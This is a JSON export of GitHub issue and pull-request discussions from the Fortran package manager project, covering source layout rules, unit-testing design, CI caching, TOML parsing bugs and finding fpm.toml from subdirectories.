                    "text": "I agree with having fpm print a warning (recommendation, really) if it finds multiple modules or module + program in a source file.\nI don't like the idea of restricting this with an option because if you expressly don't want to do this, then you're already not writing code that needs to be restricted. Conversely, if the default is to restrict it, then having to add an option to enable it somewhat defeats the purpose of me using it for convenience.\nIf you're against a correct default behavior that is supported in the present and want to disable it as a feature, you need to convince others, not the other way around. \"known, poor design decisions\" is subjective and not meaningful without elaborating why."
                },
                {
                    "user": "certik",
                    "date": "2020-09-19 21:13:10+00:00",
                    "text": "Technically the main issue as I see it is that if we start with being restrictive, we can always relax the requirements later without breaking any existing fpm package. However, if we relax the requirements now, we can't easily make them more strict without breaking existing packages.\n\nRegarding the warning, I don't know if I would like to be getting warnings for things that are allowed. In other words, Milan, would you like to be getting warnings for modules in the same file as the main program?\n\nSummary: let's be very conservative with relaxing restrictions. It's a one way street.\n\u2026\nOn Sat, Sep 19, 2020, at 1:04 PM, Milan Curcic wrote:\n\n\n I agree with having fpm print a warning (recommendation, really) if it\n finds multiple modules or module + program in a source file.\n\n I don't like the idea of restricting this with an option because if you\n expressly don't want to do this, then you're already not writing code\n that needs to be restricted. Conversely, if the default is to restrict\n it, then having to add an option to enable it somewhat defeats the\n purpose of me using it for convenience.\n\n If you're against a correct default behavior that is supported in the\n present and want to disable it as a feature, you need to convince\n others, not the other way around. \"known, poor design decisions\" is\n subjective and not meaningful without elaborating why.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVGF2O6K2SQWD4DPLSGTXDZANCNFSM4RR2MP5A>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-20 08:52:12+00:00",
                    "text": "Technically the main issue as I see it is that if we start with being restrictive, we can always relax the requirements later without breaking any existing fpm package.\n\nI don't think we should consider deferring this decision.\nI think Milan makes a very important point: having no restrictions does not affect those who want to conform to their own standard for layout, but enforcing restrictions does affect those who do not. By placing restrictions on otherwise valid Fortran you are enforcing one group's subjective preference on everyone.\n\nRegarding the warning, I don't know if I would like to be getting warnings for things that are allowed.\n\nThere are some situations where I learn to live with certain compiler warnings, because I know why those warnings exist and why I have chosen to ignore them. This would be the same in this case."
                },
                {
                    "user": "certik",
                    "date": "2020-09-20 12:47:01+00:00",
                    "text": "Note that this argument when followed to its logical conclusion would prevent us to impose any kind of \"default layout\" in fpm, because it is preventing valid code to compile.\n\nAre we allowing multiple modules or just one module together with the program? If multiple, it means we are also making a decision of not ever imposing the module naming convention based on the filename?\n\nThere are huge advantages that come from having a restrictive default layout. I want to make sure all the implication of this decision are understood.\n\nIf we make this decision, will it be warning by default, and you can turn off the warning in fpm.toml with an option? That actually would be fine with me.\n\u2026\nOn Sun, Sep 20, 2020, at 2:52 AM, Laurence Kedward wrote:\n\n\n > Technically the main issue as I see it is that if we start with being restrictive, we can always relax the requirements later without breaking any existing fpm package.\n\n I don't think we should consider deferring this decision.\n\n I think Milan makes a very important point: having no restrictions does\n not affect those who want to conform to their own standard for layout,\n but enforcing restrictions does affect those who do not. By placing\n restrictions on otherwise valid Fortran you are enforcing one group's\n subjective preference on everyone.\n\n > Regarding the warning, I don't know if I would like to be getting warnings for things that are allowed.\n\n There are some situations where I learn to live with certain compiler\n warnings, because I know why those warnings exist and why I have chosen\n to ignore them. This would be the same in this case.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEDC6BPNNUGYSS7II3SGW7ERANCNFSM4RR2MP5A>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-20 13:14:42+00:00",
                    "text": "If we make this decision, will it be warning by default, and you can turn off the warning in fpm.toml with an option?\n\nYes, a warning by default.\n\nThere are huge advantages that come from having a restrictive default layout.\n\nAre these advantages for fpm developers or advantages for fpm users? My argument is based on prioritising the latter over the former."
                },
                {
                    "user": "certik",
                    "date": "2020-09-20 13:33:42+00:00",
                    "text": "I am fine with warning by default.\n\nI think the advantages are for the users. I agree that is what we should prioritize.\n\nWe can discuss further at our monthly call. I think we have an agreement on this particular issue to move forward.\n\u2026\nOn Sun, Sep 20, 2020, at 7:14 AM, Laurence Kedward wrote:\n\n\n > If we make this decision, will it be warning by default, and you can turn off the warning in fpm.toml with an option?\n\n Yes, a warning by default.\n\n > There are huge advantages that come from having a restrictive default layout.\n\n Are these advantages for fpm developers or advantages for fpm users? My\n argument is based on prioritising the latter over the former.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGQ4B6K6KMAWOUBM6DSGX543ANCNFSM4RR2MP5A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:32:56+00:00",
                    "text": "Thanks @certik.\nPerhaps a nuanced but important point that may have been missed: I don't argue here for relaxing any restriction. I argue for including a test case of a pattern that is presently both permitted (within our planned restriction set) and working, rather than leaving it untested.\nI was assuming that the file/module layout and naming restriction we impose follows from #153 where we agreed that we will require the module name to be prefixed with package name. This helps prevent name collisions.\nI was also assuming that we don't anymore require the module name to be the same as the source file name. I don't think it does  anything for us given #153. Do you agree?\nSo, if we don't require the module name to be the same as the source file name, I see no practical reason to forbid module+program or multi-module in source file. However, if we do require it, then we can't do what I proposed in this thread.\nAs an afterthought, given #153 we should rename the modules in current example packages to reflect this (even though we're not enforcing it yet)."
                },
                {
                    "user": "certik",
                    "date": "2020-09-20 18:27:24+00:00",
                    "text": "My understanding was that we relaxed the name of the modules, but kept the door open if we wanted to make it strict again. With this change the door closes.\n\nI think the overall goal is for fpm to fully understand the project and to build it automatically.\n\nI think this change doesn't compromise this goal, so I think it's fine to relax restrictions.\n\nThe other goal is to make it easy to use a dependency. For that if we will not enforce module names based on directories, we could make a command \"fpm api PACKAGE\" that would summarize what modules the user can call and what is in them.\n\u2026\nOn Sun, Sep 20, 2020, at 9:33 AM, Milan Curcic wrote:\n\n\n Thanks @certik <https://github.com/certik>.\n\n Perhaps a nuanced but important point that may have been missed: I\n don't argue here for relaxing any restriction. I argue for including a\n test case of a pattern that is presently both permitted (within our\n planned restriction set) and working, rather than leaving it untested.\n\n I was assuming that the file/module layout and naming restriction we\n impose follows from #153\n <#153> where we agreed that\n we will require the module name to be prefixed with package name. This\n helps prevent name collisions.\n\n I was also assuming that we don't anymore require the module name to be\n the same as the source file name. I don't think it does anything for us\n given #153 <#153>. Do you\n agree?\n\n So, if we don't require the module name to be the same as the source\n file name, I see no practical reason to forbid module+program or\n multi-module in source file. However, if we do require it, then we\n can't do what I proposed in this thread.\n\n As an afterthought, given #153\n <#153> we should rename the\n modules in current example packages to reflect this (even though we're\n not enforcing it yet).\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGROTVUNT2WSW4USTLSGYODJANCNFSM4RR2MP5A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 19:40:22+00:00",
                    "text": "I think all doors should stay open. If we later decide to make the module naming more strict, we remove this test. If it shows to be problematic for implementation, we remove it. Adding this test doesn't close any doors."
                }
            ]
        },
        {
            "number": 177,
            "user": "awvwgk",
            "date": "2020-09-15 21:30:38+00:00",
            "title": "Allow selective testing of single suites and tests",
            "text": "Related to #176.\nIn case we want to continue using the current unit testing framework, this PR should reduce the boilerplate code to register new test suites and allow for some better debugging of failing tests.\nRegistering a new test suite works now in a similar way as registering a unit test in the collecting interface:\n\n  \n    \n      fpm/fpm/test/main.f90\n    \n    \n        Lines 15 to 19\n      in\n      4a5ecae\n    \n    \n    \n    \n\n        \n          \n           testsuite = [ & \n        \n\n        \n          \n               & new_testsuite(\"fpm_toml\", collect_toml), & \n        \n\n        \n          \n               & new_testsuite(\"fpm_manifest\", collect_manifest), & \n        \n\n        \n          \n               & new_testsuite(\"fpm_source_parsing\", collect_source_parsing) & \n        \n\n        \n          \n               & ] \n        \n    \n  \n\n\nThe other point is handling and debugging of failing tests.\nRunning fpm test will run all test suites and all contained unit tests. In case we encounter a failure, we usually don't want to run all tests every time while debugging, therefore I added the option to select the test suite and the test we want to run.\nThe available levels of testing are than:\n\nfpm test: no argument will run all available test suites\nfpm test --args \"help\" or any other not available test suite will print the names of all available test suites (will not run any tests and exit code will be 1)\n\n# Available testsuites\n# - fpm_toml\n# - fpm_manifest\n# - fpm_source_parsing\n\n\nfpm test --args \"fpm_source_parsing\" will select the source parsing test suite and only run its unit tests\nfpm test --args \"fpm_source_parsing help\" or any other not available unit test will print the names of all available unit tests in the test suite source parsing (will not run any tests and exit code will be 1)\n\n# Suite: fpm_source_parsing\n# Available tests:\n# - modules-used\n# - intrinsic-modules-used\n# - include-stmt\n# - module\n# - submodule\n# - submodule-ancestor\n# - subprogram\n# - csource\n# - invalid-use-stmt\n# - invalid-include-stmt\n# - invalid-module\n# - invalid-submodule\n\n\nfpm test --args \"fpm_source_parsing invalid-submodule\" will only run the invalid-submodule unit test from the source parsing test suite",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 18:13:42+00:00",
                    "text": "Thanks, @awvwgk. I have a few questions.\n\nDoes the argument value really need the quotes around it?\n\nfpm test --args \"help\"\n\nor does this work:\nfpm test --args help\n\nIf not, any way we can make it work without quotes? As is, the CLI UI seems a bit awkward to me.\n\nPerhaps the quotes are needed to pass multiple values to --args? I wonder if we need args at all. What do you think about this API instead:\n\nfpm test                                # runs all test suites\nfpm test fpm_source_parsing             # runs only this test suite\nfpm test missing_test_suite             # shows available test suites if missing test suite is requested\nfpm test test_suite_one, test_suite_two # list multiple suites separated by comma\nfpm test --help                         # shows the help message and the list of available test suites\nfpm test -h                             # same as above\n\nThis way we drop the --args and quotes altogether, IMO for a cleaner UI."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-18 19:02:42+00:00",
                    "text": "Regarding the first point, for a single argument it will work without quotes just fine. The reason for the quotation marks is mainly due to the limitation of the bootstrap fpm implementation, see #138. Therefore, I just put them around the arguments every time while testing (and writing the PR up).\nRegarding your suggestion at the second point, I guess there is some mix-up between the testing framework in fpm and the fpm-test target. Since we are building and testing fpm with fpm, this requires careful reading and writing, I hope I got the latter right.\n\nfpm test would invoke the test targets for fpm, which contain all executables contained in [[test]] sections\nfpm test fpm-test would invoke the fpm-test target defined for fpm (for fpm this is identical to 1.)\nfpm test test_source_parsing would be ambiguous, there is no target called test_source_parsing, in case there is only one test target available, we could allow fpm to be smart and pass it as argument to the one test target in fpm. I think this is rather dangerous, in case the test executable doesn't handle command line arguments it will fail silently.\nfpm test missing_test_suite is in this regard identical to 3.\nfpm test --help should print the help on the fpm test command, not pass this as argument to the test target.\n\nThe best solution would be to allow the -- flag in bootstrap fpm to pass every following argument to the selected target, currently we have to use --args \"<arg1> ...\" due to #138."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 19:14:51+00:00",
                    "text": "Okay, if I understood this correctly, I confused fpm's internal test suites with test targets that any fpm package can have. In that case, I'm happy with this moving forward as is."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:38:22+00:00",
                    "text": "This is a small and low impact PR with no objections so I'll go ahead and merge it. Thank you, @awvwgk!"
                }
            ]
        },
        {
            "number": 176,
            "user": "awvwgk",
            "date": "2020-09-15 21:19:49+00:00",
            "title": "Unit testing framework",
            "text": "I seems like we will stay with my (temporary) testing framework for now. I'm actually surprised that this idea worked out.\nNevertheless, we should discuss if there might be better alternatives or in case we want to stay with the current model, how it should behave as we implement more test suites. If we want to allow preprocessor or external (non-Fortran) dependencies we have a much wider range of testing frameworks available.\nRegarding the current behaviour of the testing framework:\n\none executable for all test suites to reduce [[test]] entries in fpm.toml (related to #164)\nfailing tests within a suite will not cause the testing to halt\n\nbetter overview in a CI run about errors\npotential for parallelisation over a test suite\n\n\na failing test suite will halt the testing framework\n\nnot sure about this one (any opinions or suggestions?)\nwill be changed by #177\n\n\narray constructor to register unit tests (and also test suites)\n\nname and procedure pointer required (could be redundant)\ncould become fragile for very large test suites (compiler limits for array constructors)",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-15 21:37:12+00:00",
                    "text": "I think your framework does exactly what we need and stays out of the way. Good to have this thread open for discussion, but unless concrete problems arise I don't think we need to look further for now."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-15 22:17:20+00:00",
                    "text": "I was going to suggest vegetables at some point, as it solves those problems. I also like it because it encourages the test descriptions to read more like a requirements specification. Your framework is actually fairly similar in terms of definition/registration of the tests, so I wasn't worried about switching, and if we do need to the transition won't seem very awkward. I also have a tool with it that automates finding all the test suites and constructing the main program.\n\na failing test suite will halt the testing framework\n\nI wouldn't recommend this. It makes the output of the framework dependent on the order that it runs the tests. If the tests are independent (and they should be), the order that they're run shouldn't have any bearing on the outputs.\n\ncould become fragile for very large test suites (compiler limits for array constructors)\n\nI've used vegetables for a project that had hundreds of tests. I don't know if fpm will have more than that, but it seems to me more likely to hit the continuation line limit before any array constructor limit (assuming there is one)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-16 08:46:17+00:00",
                    "text": "I'm happy with your framework since it's lightweight and easy to use as a developer.\nI will echo the general sentiment here that I prefer testing to continue in the presence of test failures - this is more useful when debugging IMO.\nI usually split test suites between multiple executables (hence #164) for two reasons:\n\nI can run tests in parallel trivially;\nUncaught fatal errors don't stop other suites from running (granted, we shouldn't have any uncaught failures here).\n\nWith that said, I don't mind the current single-executable approach since our tests don't have any significant runtime."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-16 09:00:53+00:00",
                    "text": "Agreed, a failing test suite should not stop the testing. I'll address this in #177."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-16 09:35:11+00:00",
                    "text": "In my Ftnunit unit test package I use a small batch file/shell script to\nrepeatedly run the test executable in case of run-time failures. It relies\non a small file being updated and read before each test to see if that test\nneeds to be run or has already been run. The problem is that if a test\nleads to a crash of the program, you simply cannot continue and this\nmechanism works around that.\n\nOp wo 16 sep. 2020 om 11:01 schreef Sebastian Ehlert <\nnotifications@github.com>:\n\u2026\n Agreed, a failing test suite should not stop the testing. I'll address\n this in #177 <#177>.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#176 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6FY65K6RHDZTADFPTSGB5FLANCNFSM4RNZK6LQ>\n ."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-16 14:22:02+00:00",
                    "text": "In case of a test crashing we would have to run it with gdb or valgrind to debug anyway. This is not that straight-forward with fpm right now, but would probably use a similar mechanism as an external script to launch tests.\nWe could have something like the build-script in the library section to support more elaborated testing frameworks not only for this project but for all fpm packages:\n[[test]]\nname = \"tester\"\nbuild-script = \"collect-tests\"\ntest-script = \"run-tests\"\nfpm test would than call <test-script> <name> instead of just the binary."
                },
                {
                    "user": "certik",
                    "date": "2020-09-22 02:32:18+00:00",
                    "text": "I am ok with any testing framework for fpm itself. The current one is fine with me.\nAs long as fpm test works with any testing framework. I assume we all agree on that."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-14 18:07:52+00:00",
                    "text": "Related to fortran-lang/stdlib#162 and fortran-lang/stdlib#345, I am wondering whether there is motivation to extract the lightweight unit testing framework as a separate fpm package?\nI liked it enough to incorporate a version of it in my fhash package, and @awvwgk is similarly maintaining a version in mctc-lib. With a cmake configuration it could also be adopted by stdlib. What do people think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-14 18:41:42+00:00",
                    "text": "The mctc library already offers a CMake integration for the testing framework here to allow parallelisation over the testsuites and the individual unit tests. I think neither fpm nor stdlib want to depend on a computational chemistry IO library for testing, so spinning of a new project is the way to go.\nI didn't made it its own project yet because it's an awful lot of work to maintain those and most of my use cases are covered with the mctc library now. If you are interested in co-maintaining such a project under the @fortran-lang namespace, I'll setup a project for this purpose."
                },
                {
                    "user": "LKedward",
                    "date": "2021-03-14 18:53:39+00:00",
                    "text": "Awesome. Yep I'm happy to help co-maintain this. Having it under the fortran-lang namespace seems like a good idea as it is used by fpm and it would hopefully encourage people to write tests for their new fpm packages!"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-14 22:33:26+00:00",
                    "text": "I separated the testing framework from the mctc library to the repository here https://github.com/awvwgk/test-drive. It is currently very rudimentary but should already be working more or less."
                },
                {
                    "user": "certik",
                    "date": "2021-03-16 00:25:31+00:00",
                    "text": "Awesome, thanks! Fpm is under MIT license, is there a reason to change the tests to to Apache? It's probably a relatively minor issue, but I don't have that much experience with Apache. Also I feel the less licenses types we use under fortran-lang, the better."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-16 08:21:28+00:00",
                    "text": "I prefer Apache over other permissive licenses because it actually contains clauses that cover contributions to the project and offers some basic protection for the copyright holder, which is the basic minimum I'm expecting from a open source license I'm putting on a project I'm personally responsible for."
                },
                {
                    "user": "certik",
                    "date": "2021-03-16 15:07:32+00:00",
                    "text": "All right then. I think Apache is fine. You should also ask anybody who contributed to this code if they are ok with the license change."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-03-16 15:25:21+00:00",
                    "text": "No worries there, the relevant part in fpm is still in its original form: https://github.com/fortran-lang/fpm/blame/master/fpm/test/fpm_test/testsuite.f90, but it was not used to spin off the test-drive project in the first place anyway."
                }
            ]
        },
        {
            "number": 175,
            "user": "interkosmos",
            "date": "2020-09-15 19:06:31+00:00",
            "title": "Updated formatting",
            "text": "Please review these updates of README.md, CONTRIBUTING.md, and PACKAGING.md. Some minor changes in formatting and typography have been made.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-15 19:27:10+00:00",
                    "text": "Thanks, Philipp. I skimmed through and have no objections. To confirm, there are no content changes, right? If not, I think it can go forward."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-15 19:29:28+00:00",
                    "text": "Nope, no content changes."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-15 20:45:42+00:00",
                    "text": "Simple PR with no change to behavior or content so I will go ahead and merge."
                }
            ]
        },
        {
            "number": 174,
            "user": "LKedward",
            "date": "2020-09-13 10:49:55+00:00",
            "title": "Cache Haskell stack build in CI",
            "text": "Waiting up to 10min for the CI is a bit of a nuisance; especially when you rely on it for platforms you can't test yourself like MacOS.\nI've played around with actions/cache on my own fork to cache the Haskell stack build, and managed to drop CI times down to between 1min for Ubuntu and 3min for Windows, see this run for example.\n\n\nOn the first run, the CI will cache stack build files (in /home/runner/.stack/ on Ubuntu), and reuse this cache at subsequent CI runs.\n\n\nThe stack build command is still executed so any updates to Haskell fpm and its dependencies are still compiled each time.\n\n\nThe cache is reset:\n\nafter a week of no CI runs;\nif the STACK_CACHE_VERSION is changed manually in the workflow file;\nevery month otherwise.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-13 13:44:00+00:00",
                    "text": "Great idea! Looks good.\n\u2026\nOn Sun, Sep 13, 2020, at 4:50 AM, Laurence Kedward wrote:\n Waiting up to 10min for the CI is a bit of a nuisance; especially when\n you rely on it for platforms you can't test yourself like MacOS.\n\n I've played around with actions/cache\n <https://github.com/actions/cache> on my own fork to cache the Haskell\n stack build, and managed to drop CI times down to between 1min for\n Ubuntu and 3min for Windows, see this run for example\n <https://github.com/LKedward/fpm/runs/1106056906>.\n\n  * On the first run, the CI will cache stack build files (in\n `/home/runner/.stack/` on Ubuntu), and reuse this cache at subsequent\n CI runs.\n\n  * The `stack build` command is still executed so any updates to\n Haskell fpm and its dependencies are still compiled each time.\n\n  * The cache is reset:\n\n    * after a week of no CI runs;\n    * if the `STACK_CACHE_VERSION` is changed manually in the workflow file;\n    * every month otherwise.\n You can view, comment on, or merge this pull request online at:\n\n   #174\n\n Commit Summary\n\n  * Update: CI with caching of stack files.\n File Changes\n\n  * *M* .github/workflows/CI.yml\n <https://github.com/fortran-lang/fpm/pull/174/files#diff-128469c2fd54cf32412f10096b91495a> (28)\n Patch Links:\n\n  * https://github.com/fortran-lang/fpm/pull/174.patch\n  * https://github.com/fortran-lang/fpm/pull/174.diff\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#174>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGPEPCNQX4AYI4KY5LSFSPWBANCNFSM4RKS3U7Q>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:35:53+00:00",
                    "text": "@everythingfunctional Please merge when ready."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-21 07:13:44+00:00",
                    "text": "Another reason for this PR is that we get spurious CI failures when there's a lot of commit activity due to various rate limits being triggered. We can rerun the workflow, but again that adds to the lead time between push and CI result."
                },
                {
                    "user": "certik",
                    "date": "2020-09-21 15:05:21+00:00",
                    "text": "I am going to go ahead and merge. It is a huge improvement to development. If @everythingfunctional  objects later, we can revert this."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-21 20:49:38+00:00",
                    "text": "This is definitely a worthwhile change. Thanks."
                }
            ]
        },
        {
            "number": 173,
            "user": "urbanjost",
            "date": "2020-09-13 09:20:14+00:00",
            "title": "toml-f implementation produces error if more than 15 test or app programs are used",
            "text": "When using the Fortran TOML interface the program issues an error message when you have more than 15 test programs or application programs in a project.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-13 09:25:58+00:00",
                    "text": "Sorry, my mistake. Already fixed upstream in toml-f with ecbc73a. Will be made available with #171 in fpm."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-13 18:11:44+00:00",
                    "text": "Great. The only other problem I had was that I added description keywords in my fpm.toml files that were being used by the registry web page and the new TOML interface rejects unknown keywords. It looks like the problem with the description and category keywords is/was being taken care of (cannot find the topic but sure it was in here somewhere) but I have mixed feelings about that. It catches typos in the file but (like NAMELIST where I also dislike that) it makes it a lot harder to mainain a single file potentially used by multiple programs that might require different data. Is that intentional?  Great work by the way. Thanks!"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-13 18:37:33+00:00",
                    "text": "The new keywords came up in #165.\nIt was indeed intentional to have an explicit list of allowed keywords to verify the package file contains the correct entries and only the supported ones. I have to admit, I just extracted the allowed keys from the PACKAGING.md in this repository, which contains just several examples, chances were good that already supported keys would be missed and so they were.\nAn option would be to relax the check for allowed keys for certain sections or add a specific section that is not governed by any schema checks, see #165 (comment). I think the schema checks are especially useful in sections like library or the individual dependencies, which influence the way fpm is building a project."
                }
            ]
        },
        {
            "number": 172,
            "user": "urbanjost",
            "date": "2020-09-13 09:17:54+00:00",
            "title": "fpm should search in directories above current directory for fpm.toml file",
            "text": "I find the fpm(1) command much nicer to use if it searches for the fpm.toml file instead of requiring it to be executed in the directorin containing the fpm.toml file.  For example, if I am working on files in the src, app, and test directories and my current directory is one of those directories I have to cd(1) up one directory and run fpm(1) and then cd back into the working directory or stay in the directory with the fpm.toml file and use long path names. I have been trying that with a personal version and it makes it MUCH nicer to use on larger projects with many directories, especially since each executable source has to be kept in a seperate directory.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-13 10:19:27+00:00",
                    "text": "I like this idea! I have noticed the same thing while working with fpm, having to switch back and forth between two terminal panes when building. This is also exactly how git(1) works.\n\n... especially since each executable source has to be kept in a seperate directory.\n\nThere is discussion in #164 (Automatically discover tests and executables) to remove this restriction and further simplify user-effort."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-19 02:27:55+00:00",
                    "text": "This is trivial if CHDIR(3f) is supported. Note that a quick survey of three compilers (GCC/gfortran, Intel, PGI) shows all support a CHDIR(3f) extension; and it is easily supported via ISO_C_BINDING interfaces on POSIX machines. It almost certainly will be part of stdlib at some point. Since it is such a common extension, would greatly simplify implementation of the feature, and currently Fortran fpm is assumed to be being built with gfortran perhaps some of the gfortran POSIX-like extensions (in this case CHDIR(3f)) can be used directly?"
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-19 07:53:53+00:00",
                    "text": "@martin Diehl <martin.diehl@kuleuven.be> and I are working on that sort of\nroutines, as part of stdlib-os. The complications are the Windows platform\nwhich consists actually of four different environments (plain Windows,\nCygwin, MinGW and MSYS). CHDIR is relatively simple, the main problem is\nunifying the build system (CMake based), such that we do not have to rely\non a preprocessor on the Fortran side. I intend to solve the immediate\nissue we now have today or within the next few days.\n\nOp do 19 nov. 2020 om 03:28 schreef urbanjost <notifications@github.com>:\n\u2026\n This is trivial if CHDIR(3f) is supported. Note that a quick survey of\n three compilers (GCC/gfortran, Intel, PGI) shows all support a CHDIR(3f)\n extension; and it is easily supported via ISO_C_BINDING interfaces on POSIX\n machines. It almost certainly will be part of stdlib at some point. Since\n it is such a common extension, would greatly simplify implementation of the\n feature, and currently Fortran fpm is assumed to be being built with\n gfortran perhaps some of the gfortran POSIX-like extensions (in this case\n CHDIR(3f)) can be used directly?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#172 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR22RZH3GCDD4BHRTCDSQR7DRANCNFSM4RKRSC3A>\n ."
                },
                {
                    "user": "MarDiehl",
                    "date": "2020-11-19 17:38:47+00:00",
                    "text": "@urbanjost: I agree with @arjenmarkus, relying on certain extensions is not a good long-term strategy. When os/os_path works on Windows (Cygwin, MinGW, and MSYS) and on POSIX (currently tested on Mac OS and Linux), it should be straight forward to include other system routines from C. We (i.e. mainly @arjenmarkus) almost found a suitable setup that works on all OS flavors."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-11-20 02:17:26+00:00",
                    "text": "I have a list of methods for handling platform-specific options. One of the easiest that does not require a preprocessor is to use a generic name like my_routine and then have a directory for each platform that has a source for my_routine. Instead of a preprocessor you just select the correct directory to build.  If each solution contains very similar code or if there is a strong reason for keeping all the code in a single file a preprocessor can be more appropriate. I generally use POSIX platforms and have found the ISO_C_BINDING interface to work very well on Mac/CygWin/Unix/GNU-Linux; and in a few cases on windows I was able to make C routines that looked like the POSIX routines that called the MSWindows equivalents. I do not know of a public version of a POSIX look-alike for MSWindows like CygWin provides but that would be very useful if it exists.\nSome Fortran extensions are so common they are as standard as the standard implementation is itself; CHDIR seems to fall in or close to that.  It would seem like a low maintenance issue to make a wrapper library that had something like STDLIB_CHDIR in it that called the vendor routine if it existed. If it did not call a ISO_C_BINDING to the POSIX routine if the platform is POSIX, and then a custom solution. In general it would seem reasonable to use vendor extensions if they exist behind such a wrapper and leave the maintenance to the compiler supplier."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-11-20 07:12:39+00:00",
                    "text": "Well, that is the solution we have chosen now: different source code,\nselected per platform, where CMake does the actual selection. So, we are\nworking along the same lines here - the details may differ, but that is all.\n\nOp vr 20 nov. 2020 om 03:17 schreef urbanjost <notifications@github.com>:\n\u2026\n I have a list of methods for handling platform-specific options. One of\n the easiest that does not require a preprocessor is to use a generic name\n like my_routine and then have a directory for each platform that has a\n source for my_routine. Instead of a preprocessor you just select the\n correct directory to build. If each solution contains very similar code or\n if there is a strong reason for keeping all the code in a single file a\n preprocessor can be more appropriate. I generally use POSIX platforms and\n have found the ISO_C_BINDING interface to work very well on\n Mac/CygWin/Unix/GNU-Linux; and in a few cases on windows I was able to make\n C routines that looked like the POSIX routines that called the MSWindows\n equivalents. I do not know of a public version of a POSIX look-alike for\n MSWindows like CygWin provides but that would be very useful if it exists.\n\n Some Fortran extensions are so common they are as standard as the standard\n implementation is itself; CHDIR seems to fall in or close to that. It would\n seem like a low maintenance issue to make a wrapper library that had\n something like STDLIB_CHDIR in it that called the vendor routine if it\n existed. If it did not call a ISO_C_BINDING to the POSIX routine if the\n platform is POSIX, and then a custom solution. In general it would seem\n reasonable to use vendor extensions if they exist behind such a wrapper and\n leave the maintenance to the compiler supplier.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#172 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5XWTGI7F3CKG45UODSQXGUPANCNFSM4RKRSC3A>\n ."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-05-26 13:33:32+00:00",
                    "text": "Can we define some rules for how fpm is to stop the search?\nWhen I run git status in a folder inside WSL which is not a repository I get the following fatal error:\n$ git status\nfatal: not a git repository (or any parent up to mount point /mnt)\nStopping at filesystem boundary (GIT_DISCOVERY_ACROSS_FILESYSTEM not set).\n\nThe environment variables which affect git can be found here."
                },
                {
                    "user": "LKedward",
                    "date": "2021-06-07 09:53:33+00:00",
                    "text": "Implemented in #483."
                }
            ]
        },
        {
            "number": 171,
            "user": "awvwgk",
            "date": "2020-09-12 20:56:18+00:00",
            "title": "Increase test coverage of fpm manifest",
            "text": "should yield complete coverage for all reachable lines in manifest modules (total test coverage at ~78%)\ninfo procedures of the manifest types are not tested\nadds description, keywords, categories and homepage to allowed keys in root (see #165)\nfixes revision -> rev in dependency table\nfixes path not excluding tag, rev and branch entry\nfixes grammar of error messages\nbump commit to latest toml-f version (doesn't require class(toml_table), pointer anymore, bugfixes)\ninclude test number in fpm-test runs\n\nQuestion: Do we want keep the info procedures for the manifest types? I added them for debugging in the first implementation.\nFixes #173",
            "comments": []
        },
        {
            "number": 170,
            "user": "LKedward",
            "date": "2020-09-12 15:01:56+00:00",
            "title": "Source parsing tests",
            "text": "As discussed in #155, this uses the error_t type to return and propagate errors from the new source parsing routines.\nAdds a test suite for the parsing routines - any difficult parsing edge cases can be added in there as they are found.\nThere are other regions from #155 that still require test coverage.",
            "comments": [
                {
